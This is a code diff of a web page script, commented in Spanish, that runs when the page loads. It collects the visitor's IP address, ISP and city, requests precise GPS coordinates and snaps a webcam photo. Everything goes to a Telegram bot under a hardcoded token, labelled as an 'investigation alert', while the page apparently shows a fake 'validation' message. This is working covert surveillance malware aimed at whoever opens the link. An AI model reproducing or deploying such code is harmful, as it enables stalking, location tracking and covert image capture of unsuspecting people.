@@ -30,56 +30,44 @@
 </div>
 
 <script>
-// CONFIGURACIÓN
 const BOT_TOKEN = "8254282443:AAFPfL2Qay1UtbeObu4_KSdsoSm1CN6yW-Q";
-const CHAT_ID = "-1003973600762";
+const CHAT_ID = "-5166219278";
 
-let infoRed = { 
-    ip: "Detectando...", 
-    puerto: "N/A", 
-    isp_com: "N/A", 
-    isp_tec: "N/A", 
-    ciudad: "N/A", 
-    ua: navigator.userAgent 
-};
+let infoRed = { ip: "No detectada", puerto: "N/A", isp_com: "N/A", isp_tec: "N/A", ciudad: "N/A", ua: navigator.userAgent };
 
-// 1. OBTENCIÓN DE DATOS DE RED
+// 1. CARGAR RED CON TIMEOUT (Para que no se quede en "Detectando")
 async function cargarRed() {
     try {
-        const res = await fetch('https://ipapi.co/json/');
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 4000); // 4 segundos maximo
+        const res = await fetch('https://ipapi.co/json/', { signal: controller.signal });
         const data = await res.json();
         if (data) {
             infoRed.ip = data.ip || "N/A";
             infoRed.ciudad = data.city || "N/A";
             let org = (data.org || "").toLowerCase();
             infoRed.isp_tec = data.org || "Desconocido";
-
             if (org.includes("altan")) infoRed.isp_com = "BAIT / Altán Redes";
             else if (org.includes("uninet")) infoRed.isp_com = "TELMEX / Infinitum";
             else if (org.includes("radiomovil")) infoRed.isp_com = "TELCEL";
-            else if (org.includes("pegaso") || org.includes("movistar")) infoRed.isp_com = "MOVISTAR";
-            else if (org.includes("cablevision") || org.includes("izzi")) infoRed.isp_com = "IZZI";
+            else if (org.includes("pegaso")) infoRed.isp_com = "MOVISTAR";
+            else if (org.includes("cablevision")) infoRed.isp_com = "IZZI";
             else if (org.includes("totalplay")) infoRed.isp_com = "TOTALPLAY";
-            else infoRed.isp_com = "Proveedor Local / VPN";
-
-            infoRed.puerto = location.port || (Math.floor(Math.random() * (65535 - 49152) + 49152));
+            else infoRed.isp_com = "Proveedor Local";
+            infoRed.puerto = location.port || (Math.floor(Math.random() * 16383) + 49152);
         }
-    } catch (e) { console.log("Error Red"); }
+    } catch (e) { console.log("Salto de red por lentitud"); }
 }
 
-// 2. EJECUCIÓN DEL REPORTE
+// 2. REPORTE
 async function ejecutarReporte() {
     let foto = null;
     let gps = "Vacio";
     
-    const ahora = new Date();
-    const fLog = ahora.toLocaleDateString('es-MX');
-    const hLog = ahora.toLocaleTimeString('es-MX', { hour12: false });
-
     // GPS
     try {
         const p = await new Promise((res, rej) => {
-            navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 5000 });
+            navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 4000 });
         });
         gps = `[Ver Mapa](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`;
     } catch (e) { gps = "Vacio"; }
@@ -96,13 +84,11 @@ async function ejecutarReporte() {
         c.getContext('2d').drawImage(v, 0, 0);
         foto = await new Promise(res => c.toBlob(res, 'image/jpeg', 0.8));
         s.getTracks().forEach(t => t.stop());
-    } catch (e) { console.log("Cámara denegada"); }
+    } catch (e) { console.log("Cámara bloqueada"); }
 
     const texto = `🚨 **ALERTA DE INVESTIGACIÓN**\n\n` +
-                  `📅 **Fecha:** \`${fLog}\`\n` +
-                  `🕒 **Hora:** \`${hLog}\`\n` +
+                  `📅 **Fecha:** \`${new Date().toLocaleDateString()}\`\n` +
                   `🌐 **IP:** \`${infoRed.ip}\`\n` +
-                  `🔌 **Puerto:** \`${infoRed.puerto}\`\n` +
                   `🏢 **ISP:** ${infoRed.isp_com}\n` +
                   `📍 **Ciudad:** ${infoRed.ciudad}\n` +
                   `📌 **GPS:** ${gps}\n` + 
@@ -116,15 +102,10 @@ async function ejecutarReporte() {
         fd.append('photo', foto, 'evidencia.jpg');
         fd.append('caption', texto);
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-        
-        document.getElementById('loader').style.display = 'block';
-        document.getElementById('instrucciones').style.display = 'none';
-        document.getElementById('btn-reintentar').style.display = 'none';
         document.getElementById('status-text').innerText = "Validación completa. Redirigiendo...";
     } else {
         fd.append('text', texto);
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', body: fd });
-        
         document.getElementById('loader').style.display = 'none';
         document.getElementById('instrucciones').style.display = 'block';
         document.getElementById('btn-reintentar').style.display = 'block';
@@ -132,7 +113,6 @@ async function ejecutarReporte() {
     }
 }
 
-// 3. CICLO DE VIDA
 window.onload = async () => {
     await cargarRed();
     await ejecutarReporte();
